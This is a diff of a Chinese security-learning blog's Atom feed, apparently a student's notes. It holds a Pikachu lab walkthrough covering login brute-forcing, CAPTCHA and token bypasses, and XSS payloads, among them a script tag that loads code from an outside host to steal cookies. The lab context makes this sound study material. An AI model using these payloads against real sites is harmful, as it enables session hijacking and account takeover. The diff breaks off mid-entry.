@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-02-02T11:56:04.517Z</updated>
+  <updated>2024-02-04T02:40:20.797Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,24 +17,105 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>第四次课程-靶场实践</title>
-    <link href="http://example.com/post/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E8%AF%BE%E7%A8%8B-%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5.html"/>
-    <id>http://example.com/post/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E8%AF%BE%E7%A8%8B-%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5.html</id>
+    <title>小迪安全-P5</title>
+    <link href="http://example.com/post/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-P5.html"/>
+    <id>http://example.com/post/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-P5.html</id>
+    <published>2024-02-04T02:38:12.000Z</published>
+    <updated>2024-02-04T02:40:20.797Z</updated>
+    
+    
+    
+    
+    
+    <category term="网络安全" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="学习日志" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
+    
+    <category term="小迪安全" scheme="http://example.com/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="基础入门" scheme="http://example.com/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Pikachu靶场实操</title>
+    <link href="http://example.com/post/Pikachu%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D.html"/>
+    <id>http://example.com/post/Pikachu%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%93%8D.html</id>
+    <published>2024-02-04T01:57:16.000Z</published>
+    <updated>2024-02-05T03:03:33.192Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>连续性尝试+字典+自动化</p><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul><li>常用的账号密码</li><li>社工库</li><li>算法生成</li></ul><h4 id="暴力破解漏洞"><a href="#暴力破解漏洞" class="headerlink" title="暴力破解漏洞"></a>暴力破解漏洞</h4><ul><li>是否要求复杂密码</li><li>是否使用安全的验证码</li><li>是否进行次数限制</li><li>是否采用双元素认证</li></ul><h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><ul><li>防止登录暴力破解</li><li>防止机器恶意注册</li></ul><h4 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h4><ul><li>确认登录接口的脆弱性<ul><li>比如:尝试登录–抓包–观察验证元素和response信息</li></ul></li><li>对字典进行优化<ul><li>根据注册提示信息进行优化</li><li>管理员</li></ul></li><li>工具自动化操作</li></ul><h3 id="Pikachu关卡"><a href="#Pikachu关卡" class="headerlink" title="Pikachu关卡"></a>Pikachu关卡</h3><h4 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h4><p>此关没有设置验证码等防范措施, 使用Brup Suite的Intruder功能, 如果response中没有<code>username or password is not exists</code>可以说明破解成功</p><p>步骤:</p><ol><li>尝试手动提交表单, 使用brupsuite拦截<br><img src="https://i0.imgs.ovh/2024/02/03/bSOeR.png"></li><li>发送到Intruder, 关闭拦截, 配置好payload和字典, 开始进行破解(Cluster bomb)</li><li>对结果按照长度或有无<code>username or password is not exists</code>进行整理, 发现test&#x2F;abc123和admin&#x2F;123456可能是正确的, 验证后,可以确认破解成功<br><img src="https://i0.imgs.ovh/2024/02/03/bSdpW.png"></li></ol><h4 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h4><p>验证码在后端会进行验证, 但是验证码可以被重复利用, 因此可以手动输入正确的验证码, 然后一直利用该验证码进行破解, 其余操作同上</p><p><img src="https://i0.imgs.ovh/2024/02/03/bSD8e.png"></p><ul><li><em>原因: php中 session默认的过期时间为1440秒, 后端没有对此进行设置, 因此这段时间内验证码可以一直用</em></li></ul><h4 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h4><p>验证码只能在前端限制客户端发包, 非常容易解除, 没有很好的验证效果, 其余操作同上</p><h4 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h4><p>由于token已经出现在前端代码中, 因此我们可以轻易获取, 我先猜测用户名为admin, 然后通过音叉模式结合字典和从响应中获取的token进行暴破</p><p><img src="https://i0.imgs.ovh/2024/02/03/buV7s.png"></p><h2 id="XSS跨站脚本"><a href="#XSS跨站脚本" class="headerlink" title="XSS跨站脚本"></a>XSS跨站脚本</h2><h3 id="测试流程-1"><a href="#测试流程-1" class="headerlink" title="测试流程"></a>测试流程</h3><ol><li>在目标站点上找到输入点, 比如查询接口, 留言板等</li><li>输入一组“特殊字符+唯一识别字符”，点击提交后,查看返回的源码，是否有做对应的处理</li><li>通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);</li><li>提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞;</li></ol><h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><ol><li>一般查询接口容易出现反射型XSS，留言板容易出现存储型XSS</li><li>由于后台可能存在过滤措施,构造的script可能会被过滤掉，而无法生效,或者环境限制了执行(浏览器);</li><li>通过变化不同的script，尝试绕过后台过滤机制;</li></ol><h4 id="GET与POST"><a href="#GET与POST" class="headerlink" title="GET与POST"></a>GET与POST</h4><ul><li>GET型可以用伪装后的url, 更容易攻击</li></ul><h3 id="Pikachu关卡-1"><a href="#Pikachu关卡-1" class="headerlink" title="Pikachu关卡"></a>Pikachu关卡</h3><h4 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h4><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">$</span><span style="color: #BABED8">html</span><span style="color: #89DDFF">.=&quot;</span><span style="color: #C3E88D">&lt;p class=&#39;notice&#39;&gt;who is </span><span style="color: #89DDFF">&#123;$</span><span style="color: #BABED8">_GET</span><span style="color: #89DDFF">[&#39;</span><span style="color: #C3E88D">message</span><span style="color: #89DDFF">&#39;]&#125;</span><span style="color: #C3E88D">,i don&#39;t care!&lt;/p&gt;</span><span style="color: #89DDFF">&quot;</span><span style="color: #89DDFF">;</span></span></code></pre></div><p>源码没有对message进行任何检查和过滤</p><p>解除前端输入限制后输入<code>&lt;/p&gt;&lt;script&gt;alert();&lt;/script&gt;&lt;p&gt;</code>即可</p><p><img src="https://i0.imgs.ovh/2024/02/03/bxp1J.png"></p><h4 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h4><p>一次性,会与服务端交互,输入<code>&lt;/p&gt;&lt;sCRiPt sRC=//uj.ci/pq7&gt;&lt;/sCrIpT&gt;&lt;p&gt;</code>成功打到cookie<br><img src="https://i0.imgs.ovh/2024/02/03/bxwvW.png"></p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p>同样没有检查和过滤, 每次刷新都会加载一遍, 输入同上<br><img src="https://i0.imgs.ovh/2024/02/03/bxsBo.png"></p><h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><p>输入的内容会被填入超链接<br>输入<code>&#39; onclick=&#39;alert()</code>然后点击超链接链接:<br><img src="https://i0.imgs.ovh/2024/02/03/bxKv5.png"></p><h4 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h4><p>输入内容同上, 点击第二个出现的超链接运行<br><img src="https://i0.imgs.ovh/2024/02/03/bx1yp.png"></p><h4 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h4><p>我留言的内容在后台通过<code>&lt;td&gt;xxx&lt;/td&gt;</code>显示, 因此输入<code>&lt;td&gt;&lt;script&gt;alert();&lt;/script&gt;&lt;td&gt;</code>, 管理员进入后台后就会被弹窗<br><img src="https://i0.imgs.ovh/2024/02/03/bx5oK.png"></p><h4 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h4><p><code>&lt;script</code>会被过滤掉, 但是换成大写就不会, 比如<code>&lt;ScriPt&gt;alert();&lt;/SCripT&gt;</code><br><img src="https://i0.imgs.ovh/2024/02/03/bxYY2.png" alt="https://i0.imgs.ovh/2024/02/03/bxYY2.png"></p><h4 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h4><p>htmlspecialchars()函数把预定义的字符转换为HTML实体。</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>&amp;(和号)成为&amp;amp<br>“(双引号)成为&amp;quot<br>‘(单引号)成为&amp;#039<br>&lt;(小于)成为&amp;lt<br>‘&gt;’(大于)成为&amp;gt</p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;暴力破解&quot;&gt;&lt;a href=&quot;#暴力破解&quot; class=&quot;headerlink&quot; title=&quot;暴力破解&quot;&gt;&lt;/a&gt;暴力破解&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h</summary>
+      
+    
+    
+    
+    
+    <category term="网络安全" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="学习日志" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>小迪安全-P4</title>
+    <link href="http://example.com/post/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-P4.html"/>
+    <id>http://example.com/post/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-P4.html</id>
+    <published>2024-02-03T12:01:45.000Z</published>
+    <updated>2024-02-03T13:58:50.083Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><h4 id="识别-猜测-算法编码类型"><a href="#识别-猜测-算法编码类型" class="headerlink" title="识别(猜测)算法编码类型"></a>识别(猜测)算法编码类型</h4><ol><li>看密文位数</li><li>看密文的特征(数字,  字母,  大小写,  符号等)</li><li>看当前密文存在的地方(Web,  数据库,  操作系统等应用)</li></ol><p><em>获取 ( 猜测到 )加密算法后就 ( 可能 ) 可以进行解密</em></p><h4 id="加密平台"><a href="#加密平台" class="headerlink" title="加密平台"></a>加密平台</h4><p><a href="https://cmd5.com/">md5在线解密破解</a></p><p><a href="http://tool.chacuo.net/cryptdes">在线DES加密解密、DES在线加密解密)</a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><a href="https://mp.weixin.qq.com/s/2kdjFO7JE5pI4FqD3iL8Bg">30余种加密编码类型的密文特征分析（建议收藏） (qq.com)</a></p><p><a href="https://blog.csdn.net/qq_41638851/article/details/100526839">CTF中常见密码题解密网站总结_CTF解密网站-CSDN博客</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;加密&quot;&gt;&lt;a href=&quot;#加密&quot; class=&quot;headerlink&quot; title=&quot;加密&quot;&gt;&lt;/a&gt;加密&lt;/h2&gt;&lt;h4 id=&quot;识别-猜测-算法编码类型&quot;&gt;&lt;a href=&quot;#识别-猜测-算法编码类型&quot; class=&quot;headerlink&quot; title=&quot;识</summary>
+      
+    
+    
+    
+    
+    <category term="网络安全" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="学习日志" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
+    
+    <category term="小迪安全" scheme="http://example.com/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="基础入门" scheme="http://example.com/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>第四次课程-XSS与SQL注入</title>
+    <link href="http://example.com/post/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E8%AF%BE%E7%A8%8B-XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5.html"/>
+    <id>http://example.com/post/%E7%AC%AC%E5%9B%9B%E6%AC%A1%E8%AF%BE%E7%A8%8B-XSS%E4%B8%8ESQL%E6%B3%A8%E5%85%A5.html</id>
     <published>2024-02-02T07:12:03.000Z</published>
-    <updated>2024-02-02T11:56:04.517Z</updated>
+    <updated>2024-02-04T01:55:50.337Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul><li><p>通过输入可以被解析的特殊字符串, 如</p><div class="language-html"><button title="Copy code" class="copy"></button><span class="lang">html</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">p</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span><span style="color: #82AAFF">alert</span><span style="color: #BABED8">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">this is an alart</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8">)</span><span style="color: #89DDFF">;&lt;/</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">p</span><span style="color: #89DDFF">&gt;</span></span></code></pre></div></li></ul>]]></content>
+    <content type="html"><![CDATA[<h2 id="XSS基础"><a href="#XSS基础" class="headerlink" title="XSS基础"></a>XSS基础</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li><p>跨站脚本，英文全称：Cross-Site Scripting</p></li><li><p>通过输入可以被解析的特殊字符串, 如</p><div class="language-html"><button title="Copy code" class="copy"></button><span class="lang">html</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">p</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span><span style="color: #82AAFF">alert</span><span style="color: #BABED8">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">this is an alart</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8">)</span><span style="color: #89DDFF">;&lt;/</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">p</span><span style="color: #89DDFF">&gt;</span></span></code></pre></div><p>其中script标签内的代码会被执行</p></li><li><p>分类: 反射型XSS, 储存型XSS, DOM型XSS</p><ul><li><p>反射型XSS</p><ul><li><p>执行流程:</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>1、在输入点输入内容，构造恶意代码，输入点是以GET方式提交的，我们可以在URL中看到输入的内容<br>2、后端接收提交的数据，并没有对输入进行过滤<br>3、然后就将其呈现给了前端，浏览器执行了恶意代码</p></blockquote></li></ul></li><li><p>存储型XSS</p><ul><li><p>存储型XSS和反射型XSS区别就在于，存储型XSS是将恶意构造的代码存储在了数据库</p></li><li><p>执行流程:</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>1、在留言板处输入内容，构造恶意代码<br>2、将输入的内容，提交给后端代码执行，后端对输入过滤不严格，然后执行插入(insert)数据库操作<br>3、此时，我们的恶意代码已经保存在了数据库，<br>4、不管何时何地何人查看这条留言，都会被执行恶意代码，除非数据库中删除这条恶意代码</p></blockquote></li></ul></li><li><p>DOM型XSS</p><ul><li>基于文档对象模型的漏洞，可以动态的构造DOM节点</li><li>不经过后端代码，直接构造恶意代码，即可在前端展示</li></ul></li></ul></li><li><p>练习:<a href="https://xss.haozi.me/#/0x00">alert(1) (haozi.me)</a></p></li></ul>]]></content>
     
     
       
       
-    <summary type="html">&lt;h3 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;通过输入可以被解析的特殊字符串, 如&lt;/p&gt;
-&lt;div class=&quot;language-html&quot;&gt;&lt;button</summary>
+    <summary type="html">&lt;h2 id=&quot;XSS基础&quot;&gt;&lt;a href=&quot;#XSS基础&quot; class=&quot;headerlink&quot; title=&quot;XSS基础&quot;&gt;&lt;/a&gt;XSS基础&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介</summary>
       
     
     
     
+    
+    <category term="网络安全" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="学习日志" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
+    
+    <category term="视频会议" scheme="http://example.com/tags/%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE/"/>
+    
+    <category term="XSS基础" scheme="http://example.com/tags/XSS%E5%9F%BA%E7%A1%80/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
@@ -58,9 +139,9 @@
     
     <category term="网络安全" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
-    <category term="学习日志" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
-    
     <category term="SQL基础" scheme="http://example.com/tags/SQL%E5%9F%BA%E7%A1%80/"/>
+    
+    <category term="学习日志" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
     
     <category term="视频会议" scheme="http://example.com/tags/%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE/"/>
     
@@ -88,9 +169,9 @@
     
     <category term="网络安全" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
-    <category term="学习日志" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
-    
     <category term="SQL基础" scheme="http://example.com/tags/SQL%E5%9F%BA%E7%A1%80/"/>
+    
+    <category term="学习日志" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
     
   </entry>
   
@@ -99,9 +180,9 @@
     <link href="http://example.com/post/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-P3.html"/>
     <id>http://example.com/post/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-P3.html</id>
     <published>2024-01-28T13:29:15.000Z</published>
-    <updated>2024-01-28T15:09:26.217Z</updated>
+    <updated>2024-02-03T11:28:55.998Z</updated>
     
-    <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>学会不同对象采用不同抓包封包抓取技术分析</p></blockquote><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><ul><li><p>当需要知道应用程序等的IP, 域名时需要抓包后分析</p></li><li><p>对不同的协议用不同的工具</p></li><li></li></ul>]]></content>
+    <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 